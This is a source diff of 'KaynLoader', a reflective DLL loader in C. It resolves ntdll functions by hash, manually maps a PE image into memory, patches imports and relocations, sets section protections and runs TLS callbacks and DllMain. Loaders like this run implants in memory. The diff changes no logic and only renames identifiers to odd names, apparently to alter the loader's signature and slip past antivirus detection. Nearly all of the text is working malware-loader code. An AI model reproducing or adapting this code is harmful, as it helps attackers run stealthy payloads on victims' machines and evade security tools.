@@ -2,133 +2,133 @@
 #include <Native.h>
 #include <ntdef.h>
 
-DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
+DLLEXPORT VOID KaynLoader( LPVOID paraaaaa )
 {
-    INSTANCE                Instance        = { 0 };
-    HMODULE                 KaynLibraryLdr  = NULL;
-    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
-    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
-    LPVOID                  KVirtualMemory  = NULL;
-    SIZE_T                  KMemSize        = 0;
-    PVOID                   SecMemory       = NULL;
-    SIZE_T                  SecMemorySize   = 0;
-    ULONG                   Protection      = 0;
-    ULONG                   OldProtection   = 0;
-    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
-    PVOID                   StartAddress    = NULL;
+    INSTANCE                Inst        = { 0 };
+    HMODULE                 KLibLd  = NULL;
+    PIMAGE_NT_HEADERS       HeadNT       = NULL;
+    PIMAGE_SECTION_HEADER   HeadSe       = NULL;
+    LPVOID                  VirtKMeme  = NULL;
+    SIZE_T                  SAZEEEE        = 0;
+    PVOID                   MemSc       = NULL;
+    SIZE_T                  MemScSize   = 0;
+    ULONG                   proto      = 0;
+    ULONG                   Oldproto   = 0;
+    PIMAGE_DATA_DIRECTORY   ImgD        = NULL;
+    PVOID                   StAdd    = NULL;
     DWORD                   rva             = 0;
     PIMAGE_TLS_DIRECTORY    tls             = 0;
-    PIMAGE_TLS_CALLBACK     *callbacks      = NULL;
+    PIMAGE_TLS_CALLBACK     *cbs      = NULL;
 
     // 0. First we need to get the DLL base
-    StartAddress   = RVA2VA( PVOID, KCharStringToWCharString, 0x70 );
-    KaynLibraryLdr = KaynCaller( StartAddress );
+    StAdd   = R2V2A( PVOID, CharStrToK, 0x70 );
+    KLibLd = Kcall( StAdd );
 
     // ------------------------
     // 1. Load needed Functions
     // ------------------------
-    Instance.Modules.Ntdll                 = KGetModuleByHash( NTDLL_HASH );
+    Inst.Modules.Ntdll                 = GetModKHsh( NTDLL_HASH );
 
-    Instance.Win32.LdrLoadDll              = KGetProcAddressByHash( &Instance, Instance.Modules.Ntdll, SYS_LDRLOADDLL, 0  );
-    Instance.Win32.NtAllocateVirtualMemory = KGetProcAddressByHash( &Instance, Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY, 0 );
-    Instance.Win32.NtProtectVirtualMemory  = KGetProcAddressByHash( &Instance, Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY, 0 );
-    Instance.Win32.NtFlushInstructionCache = KGetProcAddressByHash( &Instance, Instance.Modules.Ntdll, SYS_NTFLUSHINSTRUCTIONCACHE, 0 );
+    Inst.Win32.LdrLoadDll              = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_LDRLOADDLL, 0  );
+    Inst.Win32.NtAllocateVirtualMemory = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY, 0 );
+    Inst.Win32.NtProtectVirtualMemory  = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY, 0 );
+    Inst.Win32.NtFlushInstructionCache = GetPrAddHs( &Inst, Inst.Modules.Ntdll, SYS_NTFLUSHINSTRUCTIONCACHE, 0 );
 
     // ---------------------------------------------------------------------------
     // 2. Allocate virtual memory and copy headers and section into the new memory
     // ---------------------------------------------------------------------------
-    NtHeaders = RVA2VA( PIMAGE_NT_HEADERS, KaynLibraryLdr, ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
-    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage;
+    HeadNT = R2V2A( PIMAGE_NT_HEADERS, KLibLd, ( ( PIMAGE_DOS_HEADER ) KLibLd )->e_lfanew );
+    SAZEEEE  = HeadNT->OptionalHeader.SizeOfImage;
 
-    if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
+    if ( NT_SUCCESS( Inst.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &VirtKMeme, 0, &SAZEEEE, MEM_COMMIT, PAGE_READWRITE ) ) )
     {
         // ---- Copy Headers into new allocated memory ----
-        Memcpy(KVirtualMemory, KaynLibraryLdr, NtHeaders->OptionalHeader.SizeOfHeaders);
-        ( ( PIMAGE_NT_HEADERS ) KVirtualMemory )->OptionalHeader.ImageBase = KVirtualMemory;
+        Memcpy(VirtKMeme, KLibLd, HeadNT->OptionalHeader.SizeOfHeaders);
+        ( ( PIMAGE_NT_HEADERS ) VirtKMeme )->OptionalHeader.ImageBase = VirtKMeme;
 
         // ---- Copy Sections into new allocated memory ----
-        SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
-        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
+        HeadSe = IMAGE_FIRST_SECTION( HeadNT );
+        for ( DWORD i = 0; i < HeadNT->FileHeader.NumberOfSections; i++ )
         {
             Memcpy(
-                RVA2VA( PVOID, KVirtualMemory, SecHeader[ i ].VirtualAddress ),      // Section New Memory
-                RVA2VA( PVOID, KaynLibraryLdr, SecHeader[ i ].PointerToRawData ),    // Section Raw Data
-                SecHeader[ i ].SizeOfRawData                                      // Section Size
+                R2V2A( PVOID, VirtKMeme, HeadSe[ i ].VirtualAddress ),      // Section New Memory
+                R2V2A( PVOID, KLibLd, HeadSe[ i ].PointerToRawData ),    // Section Raw Data
+                HeadSe[ i ].SizeOfRawData                                      // Section Size
             );
         }
 
         // ----------------------------------
         // 3. Process our images import table
         // ----------------------------------
-        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
-        if ( ImageDir->VirtualAddress )
-            KResolveIAT( &Instance, KVirtualMemory, RVA2VA( PVOID, KVirtualMemory, ImageDir->VirtualAddress ) );
+        ImgD = & HeadNT->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
+        if ( ImgD->VirtualAddress )
+            KResolveIAT( &Inst, VirtKMeme, R2V2A( PVOID, VirtKMeme, ImgD->VirtualAddress ) );
 
         // ----------------------------
         // 4. Process image relocations
         // ----------------------------
-        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
-        if ( ImageDir->VirtualAddress )
-            KReAllocSections( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, RVA2VA( PVOID, KVirtualMemory, ImageDir->VirtualAddress ) );
+        ImgD = & HeadNT->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
+        if ( ImgD->VirtualAddress )
+            KReAllocSections( VirtKMeme, HeadNT->OptionalHeader.ImageBase, R2V2A( PVOID, VirtKMeme, ImgD->VirtualAddress ) );
 
         // ----------------------------------
         // 5. Set protection for each section
         // ----------------------------------
-        SecMemory     = KVirtualMemory;
-        SecMemorySize = NtHeaders->OptionalHeader.SizeOfHeaders;
-        Protection    = PAGE_READONLY;
-        OldProtection = 0;
-        Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
+        MemSc     = VirtKMeme;
+        MemScSize = HeadNT->OptionalHeader.SizeOfHeaders;
+        proto    = PAGE_READONLY;
+        Oldproto = 0;
+        Inst.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &MemSc, &MemScSize, proto, &Oldproto );
 
-        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
+        for ( DWORD i = 0; i < HeadNT->FileHeader.NumberOfSections; i++ )
         {
-            SecMemory       = RVA2VA( PVOID, KVirtualMemory, SecHeader[ i ].VirtualAddress );
-            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
-            Protection      = 0;
-            OldProtection   = 0;
+            MemSc       = R2V2A( PVOID, VirtKMeme, HeadSe[ i ].VirtualAddress );
+            MemScSize   = HeadSe[ i ].SizeOfRawData;
+            proto      = 0;
+            Oldproto   = 0;
 
-            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
-                Protection = PAGE_WRITECOPY;
+            if ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
+                proto = PAGE_WRITECOPY;
 
-            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
-                Protection = PAGE_READONLY;
+            if ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ )
+                proto = PAGE_READONLY;
 
-            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
-                Protection = PAGE_READWRITE;
+            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
+                proto = PAGE_READWRITE;
 
-            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
-                Protection = PAGE_EXECUTE;
+            if ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
+                proto = PAGE_EXECUTE;
 
-            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
-                Protection = PAGE_EXECUTE_WRITECOPY;
+            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
+                proto = PAGE_EXECUTE_WRITECOPY;
 
-            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
-                Protection = PAGE_EXECUTE_READ;
+            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
+                proto = PAGE_EXECUTE_READ;
 
-            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
-                Protection = PAGE_EXECUTE_READWRITE;
+            if ( ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( HeadSe[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
+                proto = PAGE_EXECUTE_READWRITE;
 
-            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
+            Inst.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &MemSc, &MemScSize, proto, &Oldproto );
         }
 
-        Instance.Win32.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );
+        Inst.Win32.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );
 
         // ----------------------------------
-        // 6. Execute TLS callbacks
+        // 6. Execute TLS cbs
         // ----------------------------------
-        rva = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
+        rva = HeadNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
         if ( rva != 0 )
         {
-            tls = RVA2VA(PIMAGE_TLS_DIRECTORY, KVirtualMemory, rva);
-            callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
+            tls = R2V2A(PIMAGE_TLS_DIRECTORY, VirtKMeme, rva);
+            cbs = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
 
-            if ( callbacks )
+            if ( cbs )
             {
-                while( *callbacks != NULL )
+                while( *cbs != NULL )
                 {
                     // call function
-                    (*callbacks)((LPVOID)KVirtualMemory, DLL_PROCESS_ATTACH, NULL);
-                    callbacks++;
+                    (*cbs)((LPVOID)VirtKMeme, DLL_PROCESS_ATTACH, NULL);
+                    cbs++;
                 }
             }
         }
@@ -136,12 +136,12 @@ DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
         // --------------------------------
         // 7. Finally executing our DllMain
         // --------------------------------
-        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = RVA2VA( PVOID, KVirtualMemory, NtHeaders->OptionalHeader.AddressOfEntryPoint );
-        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, lpParameter );
+        BOOL ( WINAPI *LLDKman ) ( PVOID, DWORD, PVOID ) = R2V2A( PVOID, VirtKMeme, HeadNT->OptionalHeader.AddressOfEntryPoint );
+        LLDKman( VirtKMeme, DLL_PROCESS_ATTACH, paraaaaa );
     }
 }
 
-NAKED LPVOID KaynCaller( PVOID StartAddress )
+NAKED LPVOID Kcall( PVOID StAdd )
 {
     asm(
         "start: \n"
@@ -182,7 +182,7 @@ NAKED VOID Memcpy( PVOID Destination, PVOID source, SIZE_T Size )
     );
 }
 
-PVOID KGetModuleByHash( DWORD ModuleHash )
+PVOID GetModKHsh( DWORD ModuleHash )
 {
     PLDR_DATA_TABLE_ENTRY   LoaderEntry = NULL;
     PLIST_ENTRY             ModuleList  = NULL;
@@ -212,7 +212,7 @@ FORCE_INLINE UINT32 CopyDotStr( PCHAR String )
     }
 }
 
-PVOID KGetProcAddressByHash( PINSTANCE Instance, PVOID DllModuleBase, DWORD FunctionHash, DWORD Ordinal )
+PVOID GetPrAddHs( PINSTANCE Inst, PVOID DllModuleBase, DWORD FunctionHash, DWORD Ordinal )
 {
     PIMAGE_NT_HEADERS       ModuleNtHeader          = NULL;
     PIMAGE_EXPORT_DIRECTORY ModuleExportedDirectory = NULL;
@@ -223,21 +223,21 @@ PVOID KGetProcAddressByHash( PINSTANCE Instance, PVOID DllModuleBase, DWORD Func
     PVOID                   FunctionAddr            = NULL;
     UINT32                  Index                   = 0;
 
-    ModuleNtHeader          = RVA2VA( PIMAGE_NT_HEADERS,       DllModuleBase, ( ( PIMAGE_DOS_HEADER ) DllModuleBase )->e_lfanew );
-    ModuleExportedDirectory = RVA2VA( PIMAGE_EXPORT_DIRECTORY, DllModuleBase, ModuleNtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
+    ModuleNtHeader          = R2V2A( PIMAGE_NT_HEADERS,       DllModuleBase, ( ( PIMAGE_DOS_HEADER ) DllModuleBase )->e_lfanew );
+    ModuleExportedDirectory = R2V2A( PIMAGE_EXPORT_DIRECTORY, DllModuleBase, ModuleNtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
     ExportedDirectorySize   = ModuleNtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
 
-    AddressOfNames          = RVA2VA( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfNames );
-    AddressOfFunctions      = RVA2VA( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfFunctions );
-    AddressOfNameOrdinals   = RVA2VA( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfNameOrdinals );
+    AddressOfNames          = R2V2A( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfNames );
+    AddressOfFunctions      = R2V2A( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfFunctions );
+    AddressOfNameOrdinals   = R2V2A( PVOID, DllModuleBase, ModuleExportedDirectory->AddressOfNameOrdinals );
 
     for ( DWORD i = 0; i < ModuleExportedDirectory->NumberOfNames; i++ )
     {
-        if ( KHashString( RVA2VA( PCHAR, DllModuleBase, AddressOfNames[ i ] ), 0 ) == FunctionHash )
+        if ( KHashString( R2V2A( PCHAR, DllModuleBase, AddressOfNames[ i ] ), 0 ) == FunctionHash )
         {
-            FunctionAddr = RVA2VA( PVOID, DllModuleBase, AddressOfFunctions[ AddressOfNameOrdinals[ i ] ] );
+            FunctionAddr = R2V2A( PVOID, DllModuleBase, AddressOfFunctions[ AddressOfNameOrdinals[ i ] ] );
             if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ModuleExportedDirectory &&
-                 ( ULONG_PTR ) FunctionAddr <  RVA2VA( ULONG_PTR, ModuleExportedDirectory, ExportedDirectorySize ) )
+                 ( ULONG_PTR ) FunctionAddr <  R2V2A( ULONG_PTR, ModuleExportedDirectory, ExportedDirectorySize ) )
             {
                 CHAR    Library [ MAX_PATH ] = { 0 };
                 CHAR    Function[ MAX_PATH ] = { 0 };
@@ -249,10 +249,10 @@ PVOID KGetProcAddressByHash( PINSTANCE Instance, PVOID DllModuleBase, DWORD Func
                 Memcpy( Library,  FunctionAddr, Index );
 
                 // Copy the function from our string
-                Memcpy( Function, RVA2VA( PVOID, FunctionAddr, Index + 1 ), KStringLengthA( RVA2VA( PCHAR, FunctionAddr, Index + 1 ) ) );
+                Memcpy( Function, R2V2A( PVOID, FunctionAddr, Index + 1 ), KStringLengthA( R2V2A( PCHAR, FunctionAddr, Index + 1 ) ) );
 
-                DllModuleBase = KLoadLibrary( Instance, Library );
-                FunctionAddr  = KGetProcAddressByHash( Instance, DllModuleBase, KHashString( Function, 0 ), 0 );
+                DllModuleBase = KLoadLibrary( Inst, Library );
+                FunctionAddr  = GetPrAddHs( Inst, DllModuleBase, KHashString( Function, 0 ), 0 );
             }
 
             return FunctionAddr;
@@ -262,7 +262,7 @@ PVOID KGetProcAddressByHash( PINSTANCE Instance, PVOID DllModuleBase, DWORD Func
     return NULL;
 }
 
-VOID KResolveIAT( PINSTANCE Instance, LPVOID KaynImage, LPVOID IatDir )
+VOID KResolveIAT( PINSTANCE Inst, LPVOID KaynImage, LPVOID IatDir )
 {
     PIMAGE_THUNK_DATA        OriginalTD        = NULL;
     PIMAGE_THUNK_DATA        FirstTD           = NULL;
@@ -275,26 +275,26 @@ VOID KResolveIAT( PINSTANCE Instance, LPVOID KaynImage, LPVOID IatDir )
 
     for ( pImportDescriptor = IatDir; pImportDescriptor->Name != 0; ++pImportDescriptor )
     {
-        ImportModuleName = RVA2VA( PCHAR, KaynImage, pImportDescriptor->Name );
-        ImportModule     = KLoadLibrary( Instance, ImportModuleName );
+        ImportModuleName = R2V2A( PCHAR, KaynImage, pImportDescriptor->Name );
+        ImportModule     = KLoadLibrary( Inst, ImportModuleName );
 
-        OriginalTD       = RVA2VA( PIMAGE_THUNK_DATA, KaynImage, pImportDescriptor->OriginalFirstThunk );
-        FirstTD          = RVA2VA( PIMAGE_THUNK_DATA, KaynImage, pImportDescriptor->FirstThunk );
+        OriginalTD       = R2V2A( PIMAGE_THUNK_DATA, KaynImage, pImportDescriptor->OriginalFirstThunk );
+        FirstTD          = R2V2A( PIMAGE_THUNK_DATA, KaynImage, pImportDescriptor->FirstThunk );
 
         for ( ; OriginalTD->u1.AddressOfData != 0 ; ++OriginalTD, ++FirstTD )
         {
             if ( IMAGE_SNAP_BY_ORDINAL( OriginalTD->u1.Ordinal ) )
             {
                 // TODO: get function by ordinal
-                PVOID Function = KGetProcAddressByHash( Instance, ImportModule, NULL, IMAGE_ORDINAL( OriginalTD->u1.Ordinal ) );
+                PVOID Function = GetPrAddHs( Inst, ImportModule, NULL, IMAGE_ORDINAL( OriginalTD->u1.Ordinal ) );
                 if ( Function != NULL )
                     FirstTD->u1.Function = Function;
             }
             else
             {
-                pImportByName       = RVA2VA( PIMAGE_IMPORT_BY_NAME, KaynImage, OriginalTD->u1.AddressOfData );
+                pImportByName       = R2V2A( PIMAGE_IMPORT_BY_NAME, KaynImage, OriginalTD->u1.AddressOfData );
                 DWORD  FunctionHash = KHashString( pImportByName->Name, KStringLengthA( pImportByName->Name ) );
-                LPVOID Function     = KGetProcAddressByHash( Instance, ImportModule, FunctionHash, 0 );
+                LPVOID Function     = GetPrAddHs( Inst, ImportModule, FunctionHash, 0 );
 
                 if ( Function != NULL )
                     FirstTD->u1.Function = Function;
@@ -328,7 +328,7 @@ VOID KReAllocSections( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir )
     }
 }
 
-PVOID KLoadLibrary( PINSTANCE Instance, LPSTR ModuleName )
+PVOID KLoadLibrary( PINSTANCE Inst, LPSTR ModuleName )
 {
     if ( ! ModuleName )
         return NULL;
@@ -338,7 +338,7 @@ PVOID KLoadLibrary( PINSTANCE Instance, LPSTR ModuleName )
     DWORD           dwModuleNameSize        = KStringLengthA( ModuleName );
     HMODULE         Module                  = NULL;
 
-    KCharStringToWCharString( ModuleNameW, ModuleName, dwModuleNameSize );
+    CharStrToK( ModuleNameW, ModuleName, dwModuleNameSize );
 
     if ( ModuleNameW )
     {
@@ -349,7 +349,7 @@ PVOID KLoadLibrary( PINSTANCE Instance, LPSTR ModuleName )
 
     UnicodeString.Buffer = ModuleNameW;
 
-    if ( NT_SUCCESS( Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
+    if ( NT_SUCCESS( Inst->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
         return Module;
     else
         return NULL;
@@ -406,7 +406,7 @@ SIZE_T KStringLengthW(LPCWSTR String)
     return (String2 - String);
 }
 
-SIZE_T KCharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
+SIZE_T CharStrToK( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
 {
     INT Length = MaximumAllowed;
 
